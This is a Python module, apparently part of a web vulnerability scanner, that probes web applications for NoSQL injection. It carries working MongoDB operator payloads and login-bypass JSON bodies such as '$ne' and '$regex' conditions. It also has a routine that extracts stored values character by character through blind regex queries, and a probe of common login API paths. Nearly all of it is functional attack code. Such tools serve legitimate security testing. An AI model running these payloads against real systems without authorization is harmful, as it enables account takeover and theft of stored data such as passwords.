"""
NoSQLInjectionModule - NoSQL injection testing (MongoDB, CouchDB, Elasticsearch).

Tests discovered parameters for NoSQL injection vulnerabilities using
MongoDB operator injection, authentication bypass, and blind extraction.
"""

import re
import json
import time
from typing import Any, Dict, List, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.utils import (
    print_info,
    print_good,
    print_warning,
    print_error,
    print_vuln,
    get_session,
)
import logging


class NoSQLInjectionModule:

    NOSQL_ERROR_MARKERS = [
        "mongodb", "mongoerror", "mongo", "mongosh",
        "couchdb", "couch", "couch_error",
        "elasticsearch", "elastic",
        "syntaxerror", "referenceerror", "typeerror",
        "unauthorized", "notok",
    ]

    OPERATOR_PAYLOADS = [
        '{"$gt": ""}',
        '{"$ne": null}',
        '{"$regex": ".*"}',
        '{"$where": "1==1"}',
        '{"$exists": true}',
        '{"$gte": ""}',
        '{"$lte": "z"}',
        '{"$nin": []}',
        '{"$or": [{"$gt": ""}]}',
        '{"$and": [{"$gt": ""}]}',
    ]

    AUTH_BYPASS_PAYLOADS = [
        {"username": {"$ne": ""}, "password": {"$ne": ""}},
        {"username": "admin", "password": {"$gt": ""}},
        {"username": {"$regex": ".*"}, "password": {"$gt": ""}},
        {"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}},
        {"username": {"$exists": True}, "password": {"$exists": True}},
    ]

    BLIND_TRUE_MARKERS = [
        "welcome", "dashboard", "profile", "success", "logged in",
        "account", "settings", "admin",
    ]

    BLIND_FALSE_MARKERS = [
        "invalid", "error", "failed", "denied", "wrong",
        "incorrect", "not found", "unauthorized",
    ]

    def __init__(self, scanner):
        self.scanner = scanner
        self.config = scanner.config

    def run(self, target: str, session=None):
        print_info(f"Running NoSQL injection tests on {target}...")
        results: Dict[str, Any] = {
            "target": target,
            "nosql_injections": [],
            "operator_injections": [],
        }

        if session is None:
            session = get_session()

        params = self._extract_params(target, session)
        if not params:
            print_info("No injectable parameters found for NoSQL injection testing.")
            self.scanner.scan_data["nosql_injection"] = results
            return results

        print_info(f"Testing {len(params)} parameter(s) for NoSQL injection...")
        for param_info in params:
            url = param_info.get("url", target)
            param_name = param_info.get("name", "")
            method = param_info.get("method", "GET")

            if not param_name:
                continue

            print_info(f"  Testing parameter '{param_name}' on {url}")

            result = self.test_operator_injection(url, param_name, session, method)
            if result:
                results["operator_injections"].append(result)

        json_endpoints = self._detect_json_endpoints(target, session)
        for endpoint in json_endpoints:
            result = self.test_nosql_auth_bypass(endpoint, session)
            if result:
                results["nosql_injections"].append(result)

        self.scanner.scan_data["nosql_injection"] = results
        return results

    def test_operator_injection(self, url: str, param: str, session, method: str = "POST") -> Optional[Dict[str, Any]]:
        print_info(f"    MongoDB operator injection test on '{param}'...")

        try:
            baseline_resp = self._make_request(url, param, "test_baseline_12345", method, session)
            baseline_body = baseline_resp.text or ""
            baseline_length = len(baseline_body)
            baseline_status = baseline_resp.status_code
        except Exception as e:
            logging.exception("nosql_injection.py: operation failed")
            print_warning(f"    Baseline request failed: {e}")
            return None

        for payload in self.OPERATOR_PAYLOADS:
            try:
                resp = self._make_request(url, param, payload, method, session)
                body = resp.text or ""
                body_length = len(body)

                for marker in self.NOSQL_ERROR_MARKERS:
                    if marker in body.lower():
                        finding = {
                            "type": "nosql_operator_injection",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": marker,
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"NoSQL injection (operator) in '{param}' @ {url} | "
                            f"Payload: {payload} | Marker: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[NOSQL:OPERATOR] {url} param={param} payload='{payload}' evidence='{marker}'"
                        )
                        return finding

                if resp.status_code != baseline_status:
                    finding = {
                        "type": "nosql_operator_injection",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "evidence": f"status_diff:{baseline_status}->{resp.status_code}",
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"NoSQL injection (operator) in '{param}' @ {url} | "
                        f"Payload: {payload} | Status changed: {baseline_status} -> {resp.status_code}"
                    )
                    self.scanner.findings.append(
                        f"[NOSQL:OPERATOR] {url} param={param} payload='{payload}' status_change={baseline_status}->{resp.status_code}"
                    )
                    return finding

                if resp.status_code == 200 and baseline_status != 200:
                    finding = {
                        "type": "nosql_operator_injection",
                        "url": url,
                        "param": param,
                        "method": method,
                        "payload": payload,
                        "evidence": "status_200_with_operator",
                        "status_code": resp.status_code,
                    }
                    print_vuln(
                        f"NoSQL injection (operator) in '{param}' @ {url} | "
                        f"Payload: {payload} | Got 200 OK with operator payload"
                    )
                    self.scanner.findings.append(
                        f"[NOSQL:OPERATOR] {url} param={param} payload='{payload}' got_200=true"
                    )
                    return finding

                content_diff = abs(body_length - baseline_length)
                if baseline_length > 0 and content_diff > max(100, baseline_length * 0.3):
                    true_keywords = sum(1 for kw in self.BLIND_TRUE_MARKERS if kw in body.lower())
                    false_keywords = sum(1 for kw in self.BLIND_FALSE_MARKERS if kw in body.lower())

                    if true_keywords > false_keywords:
                        finding = {
                            "type": "nosql_blind_injection",
                            "url": url,
                            "param": param,
                            "method": method,
                            "payload": payload,
                            "evidence": f"content_diff:{content_diff},true_keywords:{true_keywords}",
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"NoSQL injection (blind) in '{param}' @ {url} | "
                            f"Payload: {payload} | Content diff: {content_diff} bytes"
                        )
                        self.scanner.findings.append(
                            f"[NOSQL:BLIND] {url} param={param} payload='{payload}' diff={content_diff}"
                        )
                        return finding

            except Exception:
                logging.exception("nosql_injection.py: exception")
                continue
        print_info(f"    No NoSQL operator injection found for '{param}'.")
        return None

    def test_nosql_auth_bypass(self, url: str, session) -> Optional[Dict[str, Any]]:
        print_info(f"    NoSQL authentication bypass test on {url}...")

        for payload in self.AUTH_BYPASS_PAYLOADS:
            try:
                headers = {"Content-Type": "application/json"}
                resp = session.post(
                    url,
                    json=payload,
                    headers=headers,
                    timeout=self.config.timeout,
                    verify=self.config.verify_tls,
                )
                body = (resp.text or "").lower()

                if resp.status_code == 200:
                    success_indicators = ["token", "jwt", "session", "success",
                                          "welcome", "dashboard", "logged", "authorized"]
                    if any(indicator in body for indicator in success_indicators):
                        finding = {
                            "type": "nosql_auth_bypass",
                            "url": url,
                            "payload": json.dumps(payload),
                            "evidence": "auth_success_with_operator_payload",
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"NoSQL authentication bypass @ {url} | "
                            f"Payload: {json.dumps(payload)}"
                        )
                        self.scanner.findings.append(
                            f"[NOSQL:AUTH_BYPASS] {url} payload='{json.dumps(payload)}'"
                        )
                        return finding

                for marker in self.NOSQL_ERROR_MARKERS:
                    if marker in body:
                        finding = {
                            "type": "nosql_auth_bypass_indicator",
                            "url": url,
                            "payload": json.dumps(payload),
                            "evidence": marker,
                            "status_code": resp.status_code,
                        }
                        print_vuln(
                            f"NoSQL auth bypass (error leak) @ {url} | "
                            f"Payload: {json.dumps(payload)} | Marker: {marker}"
                        )
                        self.scanner.findings.append(
                            f"[NOSQL:AUTH_BYPASS_LEAK] {url} evidence='{marker}'"
                        )
                        return finding

            except Exception:
                logging.exception("nosql_injection.py: exception")
                continue
        print_info(f"    No NoSQL authentication bypass found at {url}.")
        return None

    def test_blind_extraction(self, url: str, param: str, session, method: str = "POST") -> Optional[Dict[str, Any]]:
        print_info(f"    Blind NoSQL extraction test on '{param}'...")

        char_payloads = []
        for i in range(32, 127):
            char = chr(i)
            escaped = char.replace('"', '\\"').replace("\\", "\\\\")
            payload = json.dumps({"$regex": f"^{escaped}.*"})
            char_payloads.append((char, payload))

        extracted = ""
        for pos in range(20):
            found = False
            for char, base_payload in char_payloads:
                if extracted:
                    escaped_prefix = re.escape(extracted).replace("\\", "\\\\")
                    char_escaped = char.replace('"', '\\"').replace("\\", "\\\\")
                    regex = f"^{extracted}{char_escaped}.*"
                    payload = json.dumps({"$regex": regex})
                else:
                    payload = base_payload

                try:
                    resp = self._make_request(url, param, payload, method, session)
                    body = resp.text or ""

                    has_true = any(kw in body.lower() for kw in self.BLIND_TRUE_MARKERS)
                    has_false = any(kw in body.lower() for kw in self.BLIND_FALSE_MARKERS)

                    if has_true and not has_false:
                        extracted += char
                        found = True
                        break
                except Exception:
                    logging.exception("nosql_injection.py: exception")
                    continue
            if not found:
                break

        if len(extracted) >= 3:
            finding = {
                "type": "nosql_blind_extraction",
                "url": url,
                "param": param,
                "method": method,
                "extracted_value": extracted,
                "evidence": f"extracted_{len(extracted)}_chars",
                "status_code": 200,
            }
            print_vuln(
                f"NoSQL blind extraction in '{param}' @ {url} | "
                f"Extracted: {extracted}"
            )
            self.scanner.findings.append(
                f"[NOSQL:BLIND_EXTRACT] {url} param={param} extracted='{extracted}'"
            )
            return finding

        print_info(f"    No blind extraction succeeded for '{param}'.")
        return None

    def _make_request(self, url: str, param: str, payload: str, method: str, session):
        if method == "GET":
            test_url = self._inject_param(url, param, payload)
            return session.get(test_url, timeout=self.config.timeout, verify=self.config.verify_tls)
        else:
            try:
                json_payload = json.loads(payload)
                return session.post(
                    url,
                    json={param: json_payload},
                    headers={"Content-Type": "application/json"},
                    timeout=self.config.timeout,
                    verify=self.config.verify_tls,
                )
            except (json.JSONDecodeError, ValueError):
                return session.post(
                    url,
                    data={param: payload},
                    timeout=self.config.timeout,
                    verify=self.config.verify_tls,
                )

    def _inject_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        qs[param] = [payload]
        new_query = urlencode(qs, doseq=True)
        return urlunparse(parsed._replace(query=new_query))

    def _extract_params(self, target: str, session=None) -> List[Dict[str, Any]]:
        params: List[Dict[str, Any]] = []

        crawl_data = self.scanner.scan_data.get("crawl", {})
        forms = crawl_data.get("forms", [])
        for form in forms:
            form_url = form.get("url", target)
            for fp in form.get("params", []):
                params.append({
                    "url": form_url,
                    "name": fp.get("name", ""),
                    "method": form.get("method", "POST"),
                })

        parsed = urlparse(target)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        for key in qs:
            params.append({
                "url": target,
                "name": key,
                "method": "GET",
            })

        seen = set()
        unique_params = []
        for p in params:
            k = (p["url"], p["name"], p["method"])
            if k not in seen:
                seen.add(k)
                unique_params.append(p)

        return unique_params

    def _detect_json_endpoints(self, target: str, session) -> List[str]:
        endpoints = []
        common_paths = [
            "/api/login", "/api/auth", "/api/user/login", "/api/session",
            "/login", "/auth", "/signin", "/api/v1/auth",
            "/api/v1/login", "/api/v1/session",
        ]

        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in common_paths:
            url = base + path
            try:
                resp = session.get(url, timeout=5, verify=self.config.verify_tls)
                ct = resp.headers.get("Content-Type", "")
                if "json" in ct or resp.status_code in (400, 401, 405):
                    endpoints.append(url)
            except Exception:
                logging.exception("nosql_injection.py: exception")
                continue
        return endpoints
